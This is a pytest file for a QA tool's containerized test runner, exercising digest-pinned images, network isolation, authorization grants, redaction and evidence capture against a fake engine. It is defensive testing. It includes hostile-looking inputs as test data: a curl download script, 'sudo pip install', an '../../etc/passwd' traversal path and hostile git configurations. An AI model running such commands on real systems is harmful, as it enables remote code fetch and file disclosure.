"""``qa run --container`` against a fake engine: who may run, what reaches the daemon, and what the run records."""
from __future__ import annotations

import io
import json
import os
import re
import shutil
import subprocess
import tarfile
from pathlib import Path

import pytest

from helpers import HOSTILE_GIT, FakeEngine, hostile_git_repo
from qa import authz, config, container, execution, ids, runner, schema, state, status, workspace
from qa.canonical import loads
from qa.errors import QaError
from qa.ingest import ReportSummary

IMAGE = "python@sha256:" + "a" * 64
OTHER_IMAGE = "python@sha256:" + "c" * 64
IMAGE_ID = "sha256:" + "b" * 64
VERSION_JSON = json.dumps({"Server": {"Version": "27.5.1", "Os": "linux", "Arch": "amd64"}}).encode()
PASSING = b'<testsuite><testcase classname="c" name="t"/></testsuite>'
FAILING = b'<testsuite><testcase classname="c" name="t"><failure/></testcase></testsuite>'
EMPTY = b'<testsuite tests="0"></testsuite>'
REPORT = (("junit", "{evidence}/junit.xml"),)
ALIAS = "build-box-7"
SSH_ENGINE = "ssh %s wsl -e docker" % ALIAS
MIB = 1 << 20
NEEDS_GIT = pytest.mark.skipif(shutil.which("git") is None, reason="tool missing: git")


def inspected(network="none", status_text="exited", code=0):
    return json.dumps([{"Image": IMAGE_ID, "HostConfig": {"NetworkMode": network}, "State": {"Status": status_text, "ExitCode": code}}]).encode()


def evidence_tar(**files):
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.GNU_FORMAT) as tar:
        root = tarfile.TarInfo(".")
        root.type = tarfile.DIRTYPE
        tar.addfile(root)
        for name, payload in files.items():
            info = tarfile.TarInfo("./" + name.replace("__", "/"))
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))
    return raw.getvalue()


def is_version(args):
    return args[:1] == ["version"]


def is_inspect(args):
    return args[:1] == ["inspect"]


def is_start(args):
    return args[:1] == ["start"]


def is_copy_in(args):
    return args[:1] == ["run"] and "-x" in args


def is_copy_out(args):
    return args[:1] == ["run"] and "-c" in args


def is_install(args):
    return args[:1] == ["run"] and "--network=bridge" in args


def is_remove(args):
    return args[:2] == ["rm", "-f"] or args[:3] == ["volume", "rm", "-f"]


def answer_as_a_daemon(fake, junit=PASSING):
    fake.when(is_version, stdout=VERSION_JSON)
    fake.when(is_inspect, stdout=inspected())
    fake.when(is_copy_out, stdout=evidence_tar(**{"junit.xml": junit}))
    return fake


@pytest.fixture
def ws_untrusted(ws, actor):
    config.record_initialized(ws, actor)
    return ws


@pytest.fixture
def fake(fake_engine):
    return answer_as_a_daemon(fake_engine)


@pytest.fixture
def ssh_fake(ws_untrusted, actor, monkeypatch):
    config.set_value(ws_untrusted, actor, "container.engine", SSH_ENGINE, "the user said yes")
    double = FakeEngine(container.Engine(SSH_ENGINE))
    monkeypatch.setattr(runner, "run_process", double.run_process)
    return answer_as_a_daemon(double)


@pytest.fixture
def unreachable(fake_engine):
    fake_engine.reply(spawn_error="not_found", exit_code=None)
    return fake_engine


@pytest.fixture
def cli(qa_cli, ws_untrusted):
    return qa_cli


def run(ws, actor, command=("pytest",), image=IMAGE, reports=REPORT, environ=None, **over):
    request = execution.RunRequest(command=command if isinstance(command, str) else list(command), container=image, reports=reports, **over)
    return execution.execute(ws, actor, request, environ=environ)


def record_of(ws, result):
    return state.load(ws)["executions"][result["execution"]]


def only_the_engine_ran(fake):
    return bool(fake.spawns) and all(spawn["command"][0] == fake.engine.argv[0] for spawn in fake.spawns)


def calls_like(fake, picks):
    return [call for call in fake.calls if picks(call)]


def stdin_of(fake, picks):
    return next(spawn["stdin_bytes"] for spawn, call in zip(fake.spawns, fake.calls) if picks(call))


def grant_install(ws, actor):
    authz.grant(ws, actor, environment_id="local", targets=[], activities=["install-dependencies"], limits={}, approval="the user said yes", expires_at=None)


def text_of(*items):
    return json.dumps(items, sort_keys=True, default=str)


# --------------------------------------------------------------------------- the brief's tests

@pytest.mark.parametrize("image", ["python:3.9-slim", "python", "python@sha256:abc", "--privileged", "python@sha256:" + "A" * 64])
def test_image_must_be_pinned_by_digest(cli, image):
    code, body = cli("run", "--container=" + image, "--", "pytest")
    assert code == 2
    assert body["error"]["code"] == "container_image_unpinned"


def test_untrusted_project_runs_in_a_container(ws_untrusted, actor, fake):
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"], result["strength"]) == ("passed", None, "structured")
    record = record_of(ws_untrusted, result)
    assert record["isolation"] == "container"
    assert record["authorization"] == "container:local"
    assert only_the_engine_ran(fake)
    assert fake.networks() == ["none", "none", "none"]


def test_untrusted_project_still_blocked_on_the_host(ws_untrusted, actor, fake):
    result = execution.execute(ws_untrusted, actor, execution.RunRequest(command=["pytest"]))
    assert (result["status"], result["reason"]) == ("blocked", "not_authorized")
    assert record_of(ws_untrusted, result)["isolation"] == "host"
    assert fake.calls == []
    assert any("--container" in text for text in result["limitations"])


def test_install_needs_its_own_grant(ws_untrusted, actor, fake):
    refused = run(ws_untrusted, actor, install="pip install -r requirements.txt")
    assert (refused["status"], refused["reason"]) == ("blocked", "not_authorized")
    assert fake.calls == []
    grant_install(ws_untrusted, actor)
    allowed = run(ws_untrusted, actor, install="pip install -r requirements.txt")
    assert allowed["status"] == "passed"
    assert fake.networks() == ["none", "bridge", "none", "none"]
    record = record_of(ws_untrusted, allowed)
    assert record["container"]["install_ran"] is True
    assert [entry["activity"] for entry in record["authorizations"]] == ["test-execution-local", "install-dependencies"]


def test_guard_still_classifies_the_command(ws_untrusted, actor, fake):
    denied = run(ws_untrusted, actor, ("sudo", "pytest"))
    assert (denied["status"], denied["reason"]) == ("blocked", "policy_denied")
    needs_grant = run(ws_untrusted, actor, ("pip", "install", "x"))
    assert (needs_grant["status"], needs_grant["reason"]) == ("blocked", "not_authorized")
    assert fake.calls == []


def test_guard_also_classifies_the_install_script(ws_untrusted, actor, fake):
    grant_install(ws_untrusted, actor)
    denied = run(ws_untrusted, actor, install="sudo pip install x")
    assert (denied["status"], denied["reason"]) == ("blocked", "policy_denied")
    hidden = run(ws_untrusted, actor, install="curl https://example.test/x.sh -o x.sh")
    assert (hidden["status"], hidden["reason"]) == ("blocked", "not_authorized")
    assert fake.calls == []


def test_engine_down_blocks_and_never_runs_on_the_host(ws_untrusted, actor, unreachable):
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"], result["strength"]) == ("blocked", "dependency_unavailable", None)
    assert only_the_engine_ran(unreachable)
    assert any("remedy" in text and "container_engine_unavailable" in text for text in result["limitations"])
    record = record_of(ws_untrusted, result)
    assert (record["exit_code"], record["isolation"]) == (None, "container")
    assert record["container"]["daemon_version"] is None


def test_image_absent_is_blocked_and_never_pulled(ws_untrusted, actor, fake):
    fake.when(is_copy_in, exit_code=125, stderr=b"docker: Error: No such image: x")
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("container_image_missing" in text and "pull" in text for text in result["limitations"])
    assert not any("pull" in call[:2] for call in fake.calls)
    assert all("--pull=never" in call for call in fake.calls if call[0] in ("run", "create"))


@pytest.mark.parametrize("code", [1, 126, 127])
def test_failed_install_is_blocked_dependency_unavailable(ws_untrusted, actor, fake, code):
    grant_install(ws_untrusted, actor)
    fake.when(is_install, exit_code=code, stderr=b"could not install")
    result = run(ws_untrusted, actor, shell=True, command="pytest", install="pip install x")
    assert (result["status"], result["reason"], result["strength"]) == ("blocked", "dependency_unavailable", None)
    assert calls_like(fake, is_start) == []
    record = record_of(ws_untrusted, result)
    assert (record["exit_code"], record["timed_out"]) == (None, False)
    assert record["container"]["install_ran"] is True
    assert record["reports"] == [{"format": "junit", "pattern": "{evidence}/junit.xml", "files": [], "error": None}]
    assert any("install" in text and "remedy" in text for text in result["limitations"])
    stored = ws_untrusted.path("evidence", result["execution"], "stderr.log")
    assert b"could not install" in stored.read_bytes()


def test_install_that_runs_out_of_time_is_blocked(ws_untrusted, actor, fake):
    grant_install(ws_untrusted, actor)
    fake.when(is_install, exit_code=None, timed_out=True)
    result = run(ws_untrusted, actor, install="pip install x")
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert record_of(ws_untrusted, result)["timed_out"] is False
    assert any("timed out" in text for text in result["limitations"])


def test_record_names_the_daemon_platform_not_the_launcher(ws_untrusted, actor, fake):
    record = record_of(ws_untrusted, run(ws_untrusted, actor))
    environment = record["environment"]
    assert environment["platform"] == "linux-amd64"
    assert (environment["python"], environment["implementation"], environment["tools"]) == (None, None, {})
    assert environment["launcher"]["platform"] != "" and "python" in environment["launcher"]
    assert record["container"] == {"image": IMAGE, "image_id": IMAGE_ID, "engine_kind": "local", "daemon_version": "27.5.1",
                                   "network_mode": "none", "install_ran": False, "service": None}


def test_engine_alias_never_reaches_the_ledger(ws_untrusted, actor, ssh_fake):
    ssh_fake.when(is_start, stdout=b"ok\n", stderr=b"warning from %s here\n" % ALIAS.encode())
    result = run(ws_untrusted, actor)
    record = record_of(ws_untrusted, result)
    assert record["container"]["engine_kind"] == "ssh"
    results = list(state.load(ws_untrusted)["results"].values())
    stored = sorted(ws_untrusted.path("evidence", result["execution"]).rglob("*"))
    evidence = text_of([path.read_bytes().decode() for path in stored if path.is_file()])
    for needle in (ALIAS, str(ws_untrusted.root)):
        assert needle not in text_of(result, record, results)
        assert needle not in evidence


@pytest.mark.parametrize("reason", ["not_found", "spawn_failed"])
def test_engine_alias_stays_out_of_a_blocked_record(ws_untrusted, actor, ssh_fake, reason):
    ssh_fake.reply(spawn_error=reason, exit_code=None)
    ssh_fake.when(is_version, spawn_error=reason, exit_code=None)
    result = run(ws_untrusted, actor)
    assert result["status"] == "blocked"
    record = record_of(ws_untrusted, result)
    assert record["container"]["engine_kind"] == "ssh"
    assert ALIAS not in text_of(result, record)


def test_alias_is_replaced_only_as_a_whole_word(ws_untrusted, actor, ssh_fake):
    ssh_fake.when(is_start, stderr=b"x%sy and %s.\n" % (ALIAS.encode(), ALIAS.encode()))
    result = run(ws_untrusted, actor)
    stored = ws_untrusted.path("evidence", result["execution"], "stderr.log").read_bytes()
    assert b"x" + ALIAS.encode() + b"y" in stored


def test_evidence_token_maps_inside_the_container(ws_untrusted, actor, fake):
    result = run(ws_untrusted, actor, ("pytest", "--junitxml={evidence}/junit.xml", "a b"))
    script = stdin_of(fake, is_start)
    assert b"--junitxml=/qa-evidence/junit.xml 'a b'" in script
    assert b"{evidence}" not in script and str(ws_untrusted.root).encode() not in script
    record = record_of(ws_untrusted, result)
    assert record["command"]["argv"][1] == "--junitxml={evidence}/junit.xml"
    assert record["reports"][0]["files"] == ["reports/junit.xml"]
    assert ws_untrusted.path("evidence", result["execution"], "reports", "junit.xml").read_bytes() == PASSING


def test_evidence_token_maps_in_a_shell_string(ws_untrusted, actor, fake):
    run(ws_untrusted, actor, "pytest --junitxml='{evidence}/junit.xml'", shell=True)
    assert b"--junitxml='/qa-evidence/junit.xml'" in stdin_of(fake, is_start)


def test_container_streams_are_redacted_and_capped(ws_untrusted, actor, fake):
    config.set_value(ws_untrusted, actor, "defaults.max_log_mb", 1, "smaller logs")
    bait = "-".join(("qa", "bait", os.urandom(8).hex()))
    fake.when(is_start, stdout=bait.encode() + b"\n" + b"x" * MIB, stderr=b"e" * 10)
    fake.when(is_copy_out, stdout=evidence_tar(**{"junit.xml": PASSING.replace(b'name="t"', b'name="%s"' % bait.encode())}))
    result = run(ws_untrusted, actor, environ={"API_TOKEN": bait, "PATH": "/nope"})
    folder = ws_untrusted.path("evidence", result["execution"])
    stdout = (folder / "stdout.log").read_bytes()
    assert bait.encode() not in stdout
    assert b"[TRUNCATED:" in stdout
    assert bait.encode() not in (folder / "reports" / "junit.xml").read_bytes()
    assert "stdout_truncated" in result["limitations"]


def test_evidence_cap_is_wider_than_the_log_cap(ws_untrusted, actor, fake):
    run(ws_untrusted, actor)
    copy_out = next(spawn for spawn, call in zip(fake.spawns, fake.calls) if is_copy_out(call))
    start = next(spawn for spawn, call in zip(fake.spawns, fake.calls) if is_start(call))
    assert copy_out["max_bytes"] == start["max_bytes"] == 256 * MIB


@pytest.mark.parametrize("junit, exit_code, expected", [
    (EMPTY, 0, ("inconclusive", "no_tests_collected")),
    (FAILING, 0, ("failed", "assertion")),
    (FAILING, 1, ("failed", "assertion")),
    (PASSING, 1, ("inconclusive", "exit_code_mismatch")),
    (b"not a report", 0, ("inconclusive", "report_invalid")),
])
def test_status_rules_hold_for_container_runs(ws_untrusted, actor, fake, junit, exit_code, expected):
    fake.when(is_start, exit_code=exit_code)
    fake.when(is_inspect, stdout=inspected(code=exit_code))
    fake.when(is_copy_out, stdout=evidence_tar(**{"junit.xml": junit}))
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == expected
    assert ("exit_code_mismatch" in result["anomalies"]) == (expected[0] == "failed" and exit_code == 0)


@pytest.mark.parametrize("code, reason", [(127, "tool_missing"), (126, "not_executable")])
def test_a_command_the_image_lacks_is_blocked(ws_untrusted, actor, fake, code, reason):
    fake.when(is_start, exit_code=code)
    fake.when(is_inspect, stdout=inspected(code=code))
    result = run(ws_untrusted, actor, reports=())
    assert (result["status"], result["reason"]) == ("blocked", reason)


def test_a_timed_out_container_is_inconclusive(ws_untrusted, actor, fake):
    fake.when(is_start, exit_code=None, timed_out=True)
    result = run(ws_untrusted, actor, reports=())
    assert (result["status"], result["reason"]) == ("inconclusive", "timeout")


# --------------------------------------------------------------------------- network isolation

def test_network_not_isolated_is_an_anomaly_status_keeps():
    assert "network_not_isolated" in status.ANOMALY_ORDER
    decision = status.decide(status.StatusInputs(exit_code=1, anomalies=("network_not_isolated",)))
    assert (decision.status, decision.reason, decision.anomalies) == ("failed", "nonzero_exit", ("network_not_isolated",))


def test_network_not_isolated_is_never_a_pass():
    decision = status.decide(status.StatusInputs(exit_code=0, anomalies=("network_not_isolated",)))
    assert (decision.status, decision.reason, decision.anomalies) == ("inconclusive", "network_not_isolated", ("network_not_isolated",))


def test_network_not_isolated_stops_a_structured_pass():
    summary = ReportSummary("junit", "tests", (), (), 1, ())
    decision = status.decide(status.StatusInputs(exit_code=0, summary=summary, report_declared=True, allow_empty=True,
                                                 anomalies=("network_not_isolated",)))
    assert (decision.status, decision.reason) == ("inconclusive", "network_not_isolated")


@pytest.mark.parametrize("network", ["bridge", "host", "unknown"])
def test_a_container_that_had_a_network_is_not_a_clean_run(ws_untrusted, actor, fake, network):
    fake.when(is_inspect, stdout=inspected(network=network))
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("inconclusive", "network_not_isolated")
    assert result["anomalies"] == ["network_not_isolated"]
    assert record_of(ws_untrusted, result)["container"]["network_mode"] == network


# --------------------------------------------------------------------------- failures of the pipeline

def test_a_failed_step_blocks_with_a_remedy(ws_untrusted, actor, fake):
    fake.when(lambda args: args[:2] == ["volume", "create"], exit_code=1, stderr=b"disk full")
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("container_step_failed" in text and "volume_create" in text and "remedy" in text for text in result["limitations"])
    assert only_the_engine_ran(fake)


def test_a_project_over_the_cap_blocks_and_stays_home(ws_untrusted, actor, fake, monkeypatch):
    monkeypatch.setattr(container, "DEFAULT_ARCHIVE_MAX_BYTES", 16)
    (ws_untrusted.root / "big.txt").write_bytes(b"x" * 4096)
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("project_too_large" in text for text in result["limitations"])
    assert fake.calls == []


def test_an_unusable_workdir_blocks_and_stays_home(ws_untrusted, actor, fake):
    (ws_untrusted.root / "a dir").mkdir()
    result = run(ws_untrusted, actor, cwd=Path("a dir"))
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("container_spec_invalid" in text for text in result["limitations"])
    assert fake.calls == []


def test_an_os_error_blocks_and_stays_home(ws_untrusted, actor, fake, monkeypatch):
    def broken(*_args, **_kw):
        raise PermissionError("no")

    monkeypatch.setattr(container, "project_archive", broken)
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert fake.calls == []


def test_a_lost_connection_during_the_tests_is_blocked(ws_untrusted, actor, fake):
    fake.when(is_start, exit_code=255)
    fake.when(is_version, stdout=b"", exit_code=255)
    fake.when(is_version, times=1, stdout=VERSION_JSON)
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("connection_lost" in text for text in result["limitations"])
    assert only_the_engine_ran(fake)


def test_unapproved_engine_is_not_authorized_and_nothing_starts(ws_untrusted, actor, fake):
    cfg = loads(workspace.read_config(ws_untrusted))
    cfg["container"] = {"engine": SSH_ENGINE}
    workspace.write_atomic(ws_untrusted.path("config.json"), workspace.config_bytes(cfg))
    config.accept(ws_untrusted, actor, "accepted the edited file")
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "not_authorized")
    assert any("container_engine_unapproved" in text for text in result["limitations"])
    assert fake.calls == []
    record = record_of(ws_untrusted, result)
    assert record["isolation"] == "container" and "container" not in record
    assert ALIAS not in text_of(result, record)


def test_a_cleanup_failure_surfaces_in_the_record(ws_untrusted, actor, fake):
    fake.when(is_remove, exit_code=1, stderr=b"still in use")
    result = run(ws_untrusted, actor)
    assert result["status"] == "passed"
    assert any("container_cleanup_failed" in text and "qa-exe-" in text for text in record_of(ws_untrusted, result)["limitations"])


def test_a_cleanup_failure_after_a_failed_step_surfaces_too(ws_untrusted, actor, fake):
    fake.when(lambda args: args[:2] == ["volume", "create"], exit_code=1)
    fake.when(is_remove, exit_code=1, stderr=b"still in use")
    result = run(ws_untrusted, actor)
    assert result["status"] == "blocked"
    assert any("container_cleanup_failed" in text and "qa-exe-" in text for text in result["limitations"])


def test_evidence_that_did_not_come_back_is_stated(ws_untrusted, actor, fake):
    fake.when(is_copy_out, exit_code=1)
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("inconclusive", "report_missing")
    assert any("evidence_not_copied" in text and "copy_out_failed" in text for text in result["limitations"])


def test_a_file_named_reports_cannot_stop_the_reports(ws_untrusted, actor, fake):
    raw = evidence_tar(**{"reports": b"in the way", "junit.xml": PASSING})
    fake.when(is_copy_out, stdout=raw)
    result = run(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("passed", None)


def test_undeclared_container_files_are_not_kept(ws_untrusted, actor, fake):
    fake.when(is_copy_out, stdout=evidence_tar(**{"junit.xml": PASSING, "sub__secret.txt": b"data", "manifest.json": b"{}"}))
    result = run(ws_untrusted, actor)
    folder = ws_untrusted.path("evidence", result["execution"])
    assert sorted(p.relative_to(folder).as_posix() for p in folder.rglob("*") if p.is_file()) == [
        "command.json", "manifest.json", "reports/junit.xml", "stderr.log", "stdout.log"]
    assert any("undeclared" in text for text in result["limitations"])


# --------------------------------------------------------------------------- what reaches the daemon

def test_the_tree_is_never_mounted_and_no_host_environment_goes_in(ws_untrusted, actor, fake):
    run(ws_untrusted, actor, environ={"API_TOKEN": "secret-value-here", "PATH": "/nope"})
    for call in fake.calls:
        assert not any(arg in ("-e", "--env", "--env-file") or arg.startswith(("--env=", "--mount")) for arg in call), call
        assert all(arg.split("=", 1)[1].startswith("qa-exe-") for arg in call if arg.startswith("--volume="))
        assert not any(str(ws_untrusted.root) in arg for arg in call)


def test_the_working_directory_maps_under_work(ws_untrusted, actor, fake):
    (ws_untrusted.root / "pkg" / "tests").mkdir(parents=True)
    run(ws_untrusted, actor, cwd=Path("pkg") / "tests")
    assert "--workdir=/work/pkg/tests" in calls_like(fake, lambda args: args[:1] == ["create"])[0]


def test_the_host_environment_is_not_claimed_for_the_container(ws_untrusted, actor, fake):
    record = record_of(ws_untrusted, run(ws_untrusted, actor, environ={"CI": "true", "PATH": "/nope"}))
    assert (record["env_names"], record["env_values"]) == ([], {})


def test_command_json_names_the_image_and_the_install(ws_untrusted, actor, fake):
    grant_install(ws_untrusted, actor)
    result = run(ws_untrusted, actor, install="pip install x")
    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
    assert (stored["container"], stored["install"]) == (IMAGE, "pip install x")


@NEEDS_GIT
def test_a_dirty_tree_is_recorded_with_the_container_run(ws_untrusted, actor, fake):
    root = ws_untrusted.root
    git = ["git", "-c", "user.name=t", "-c", "user.email=t@example.test", "-c", "commit.gpgsign=false"]
    (root / "tracked.txt").write_bytes(b"x")
    for args in (["init", "-q"], ["add", "tracked.txt"], ["commit", "-q", "-m", "c"]):
        subprocess.run(git + args, cwd=str(root), check=True, capture_output=True)
    (root / "tracked.txt").unlink()
    result = run(ws_untrusted, actor)
    assert record_of(ws_untrusted, result)["git"]["dirty"] is True
    assert any("dirty_worktree" in text for text in result["limitations"])


@NEEDS_GIT
@pytest.mark.parametrize("how", HOSTILE_GIT)
def test_a_program_the_repository_configures_never_runs_before_a_container_run(ws_untrusted, actor, fake, tmp_path, how):
    marker = tmp_path / "PWNED"
    hostile_git_repo(ws_untrusted.root, marker, how)
    result = run(ws_untrusted, actor)
    assert not marker.exists()
    assert record_of(ws_untrusted, result)["git"]["commit"]


# --------------------------------------------------------------------------- the request

@pytest.mark.parametrize("over, code", [
    (dict(install="pip install x"), "install_needs_container"),
    (dict(container="", install=None), "container_image_unpinned"),
    (dict(container=IMAGE, install="   "), "invalid_command"),
    (dict(container=IMAGE, reports=(("junit", "out/junit.xml"),)), "report_outside_evidence"),
    (dict(container=IMAGE, reports=(("junit", "{evidence}/../../etc/passwd"),)), "report_outside_evidence"),
    (dict(container=IMAGE, reports=(("junit", "/qa-evidence/junit.xml"),)), "report_outside_evidence"),
])
def test_requests_that_cannot_mean_a_container_run_are_refused(ws_untrusted, actor, fake, over, code):
    with pytest.raises(QaError) as refused:
        execution.execute(ws_untrusted, actor, execution.RunRequest(command=["pytest"], **over))
    assert refused.value.code == code
    assert fake.calls == []


def test_cli_passes_the_container_and_install(cli):
    code, body = cli("run", "--install=pip install x", "--", "pytest")
    assert (code, body["error"]["code"]) == (2, "install_needs_container")
    code, body = cli("run", "--help")
    assert "--container" in body["help"] and "--install" in body["help"]


def test_an_attempt_keeps_to_the_image_of_the_run_it_repeats(ws_untrusted, actor, fake):
    first = run(ws_untrusted, actor)["execution"]
    assert run(ws_untrusted, actor, attempt_of=first)["status"] == "passed"
    other = run(ws_untrusted, actor, image=OTHER_IMAGE, attempt_of=first)
    assert (other["status"], other["reason"]) == ("blocked", "policy_denied")
    assert any("isolation" in text for text in other["limitations"])


# --------------------------------------------------------------------------- authorization

def _check(ws, activity="test-execution-local", env_class="local", trust="untrusted", containerized=True, st=None):
    cfg = loads(workspace.read_config(ws))
    cfg["project"]["trust"] = trust
    return authz.check(state.empty_state() if st is None else st, cfg, activity=activity, environment={"id": "e", "class": env_class},
                       now=ids.now_utc(), containerized=containerized)


def test_containerized_lifts_only_the_untrusted_refusal(ws):
    allowed = _check(ws)
    assert (allowed.allowed, allowed.authorization) == (True, "container:local")
    host = _check(ws, containerized=False)
    assert (host.allowed, host.reason) == (False, "not_authorized")
    assert "--container" in host.detail


def test_containerized_keeps_trusted_runs_as_they_were(ws):
    assert _check(ws, trust="trusted").authorization == "trusted:local"


@pytest.mark.parametrize("activity, env_class, reason", [
    ("deploy", "local", "policy_denied"),
    ("credential-use", "local", "policy_denied"),
    ("db-write", "production", "policy_denied"),
    ("test-execution-local", "ci", "policy_denied"),
    ("test-execution-local", "staging", "not_authorized"),
    ("test-execution-local", "production", "not_authorized"),
    ("install-dependencies", "local", "not_authorized"),
    ("network-download", "local", "not_authorized"),
])
def test_every_other_rule_stands_for_a_container(ws, activity, env_class, reason):
    decision = _check(ws, activity=activity, env_class=env_class)
    assert (decision.allowed, decision.reason) == (False, reason)


def test_only_a_real_container_request_sets_containerized(ws_untrusted, actor, fake, monkeypatch):
    seen = []
    real = authz.check

    def spy(*args, **kw):
        seen.append(kw.get("containerized"))
        return real(*args, **kw)

    monkeypatch.setattr(authz, "check", spy)
    execution.execute(ws_untrusted, actor, execution.RunRequest(command=["pytest"]))
    assert seen == [False] and fake.calls == []
    del seen[:]
    run(ws_untrusted, actor)
    assert seen == [True] and calls_like(fake, is_start)


# --------------------------------------------------------------------------- the image catalog

def test_catalog_pins_every_base_image_by_digest():
    from pathlib import Path as P
    document = loads((P(container.__file__).resolve().parents[2] / "policies" / "container-images.json").read_bytes())
    assert schema.errors(document, schema.load_schema("container-images.schema.json"), base="container-images.schema.json") == []
    assert [entry["id"] for entry in document["images"]] == ["python-3.9", "python-newest", "node-lts", "temurin-lts"]
    for entry in document["images"]:
        assert container.is_pinned(entry["image"])
        assert re.fullmatch(r"[a-z-]+@sha256:[0-9a-f]{64}", entry["image"])
        assert {"linux/amd64", "linux/arm64"} <= set(entry["platforms"])


# --------------------------------------------------------------------------- a fixture service and inputs

SERVICE = "python@sha256:" + "d" * 64
SERVICE_IMAGE_ID = "sha256:" + "e" * 64
SVC_ID = "c" * 64
SERVE = "exec python -m http.server --bind 127.0.0.1 8080"


def service_inspected(network="none", running=True, code=0):
    return json.dumps([{"Id": SVC_ID, "Image": SERVICE_IMAGE_ID, "HostConfig": {"NetworkMode": network},
                        "State": {"Status": "running" if running else "exited", "Running": running, "ExitCode": code}}]).encode()


def is_service_inspect(args):
    return args[:1] == ["inspect"] and args[-1].endswith("-svc")


def is_logs(args):
    return args[:1] == ["logs"]


def is_service(args):
    return args[:2] == ["run", "-d"]


def answer_with_a_service(fake, service_mode="none", log=b"serving on 127.0.0.1\n"):
    fake.when(is_inspect, stdout=inspected(network="container:" + SVC_ID))
    fake.when(is_service_inspect, stdout=service_inspected(network=service_mode))
    fake.when(is_logs, stdout=log)
    return fake


def run_service(ws, actor, **over):
    fields = dict(service=SERVICE, service_run=SERVE)
    fields.update(over)
    return run(ws, actor, **fields)


def put(ws, name, data=b"x"):
    path = ws.root / name
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return path


def ledger_events(ws):
    from qa import ledger
    return ledger.iter_all_events(ws)


def test_service_run_records_the_pair(ws_untrusted, actor, fake):
    answer_with_a_service(fake)
    result = run_service(ws_untrusted, actor, service_user="1000:1000")
    assert (result["status"], result["reason"], result["anomalies"]) == ("passed", None, [])
    assert fake.networks() == ["none", "none", "none", "container:qa-%s-svc" % result["execution"].lower(), "none"]
    record = record_of(ws_untrusted, result)
    assert record["container"]["network_mode"] == "none"
    assert record["container"]["service"] == {"image": SERVICE, "image_id": SERVICE_IMAGE_ID, "network_mode": "none",
                                              "running_at_end": True, "exit_code": None}
    stored = loads(ws_untrusted.path("evidence", result["execution"], "command.json").read_bytes())
    assert (stored["service"], stored["service_run"], stored["service_user"], stored["inputs"]) == (SERVICE, SERVE, "1000:1000", [])
    assert "--user=1000:1000" in calls_like(fake, is_service)[0]


def test_a_run_without_a_service_records_none(ws_untrusted, actor, fake):
    result = run(ws_untrusted, actor)
    record = record_of(ws_untrusted, result)
    assert record["container"]["service"] is None
    assert "service.log" not in record["evidence_manifest"]["files"]


def test_service_with_a_network_makes_the_run_inconclusive(ws_untrusted, actor, fake):
    answer_with_a_service(fake, service_mode="bridge")
    result = run_service(ws_untrusted, actor)
    assert (result["status"], result["reason"], result["anomalies"]) == ("inconclusive", "network_not_isolated", ["network_not_isolated"])
    record = record_of(ws_untrusted, result)
    assert record["container"]["service"]["network_mode"] == "bridge"
    assert record["container"]["network_mode"] == "container:" + SVC_ID


def test_service_log_is_evidence_and_redacted(ws_untrusted, actor, fake):
    bait = "-".join(("qa", "bait", os.urandom(8).hex()))
    answer_with_a_service(fake, log=b"started with " + bait.encode() + b"\n")
    result = run_service(ws_untrusted, actor, environ={"API_TOKEN": bait, "PATH": "/nope"})
    folder = ws_untrusted.path("evidence", result["execution"])
    stored = (folder / "service.log").read_bytes()
    assert bait.encode() not in stored and b"started with" in stored
    record = record_of(ws_untrusted, result)
    assert "service.log" in record["evidence_manifest"]["files"] and record["redactions"] >= 1


def test_service_log_is_capped_and_never_names_the_engine_host(ws_untrusted, actor, ssh_fake):
    config.set_value(ws_untrusted, actor, "defaults.max_log_mb", 1, "smaller logs")
    answer_with_a_service(ssh_fake, log=b"from %s\n" % ALIAS.encode() + b"y" * (MIB + 10))
    result = run_service(ws_untrusted, actor)
    stored = ws_untrusted.path("evidence", result["execution"], "service.log").read_bytes()
    assert ALIAS.encode() not in stored and b"[TRUNCATED:" in stored
    assert "service_log_truncated" in result["limitations"]


def test_a_service_that_stopped_is_stated(ws_untrusted, actor, fake):
    answer_with_a_service(fake)
    fake.when(is_service_inspect, stdout=service_inspected(running=False, code=3))
    result = run_service(ws_untrusted, actor)
    assert any("service_stopped" in text and "3" in text for text in result["limitations"])


def test_a_service_the_engine_lacks_blocks_and_records_the_request(ws_untrusted, actor, fake):
    answer_with_a_service(fake)
    fake.when(is_service, exit_code=125, stderr=b"docker: Unable to find image 'x' locally\n")
    result = run_service(ws_untrusted, actor)
    assert (result["status"], result["reason"]) == ("blocked", "dependency_unavailable")
    assert any("container_image_missing" in text for text in result["limitations"])
    assert record_of(ws_untrusted, result)["container"]["service"] == {
        "image": SERVICE, "image_id": None, "network_mode": None, "running_at_end": False, "exit_code": None}


def test_input_outside_qa_work_is_refused(ws, tmp_path, actor, fake):
    outside = tmp_path / "outside.txt"
    outside.write_bytes(b"HOST-FILE")
    work = ws.root / ".qa" / "work"
    put(ws, ".qa/work/f")
    (work / "link").symlink_to(outside)
    (work / "dir").mkdir()
    with open(str(work / "big"), "wb") as big:
        big.truncate(17 * MIB)  # sparse: past the cap without writing it
    (ws.root / "linked-parent").symlink_to(ws.root)
    put(ws, ".qa/work/real/f")
    (work / "via").symlink_to(work / "real")
    os.mkfifo(str(work / "pipe"))
    before = ledger_events(ws)
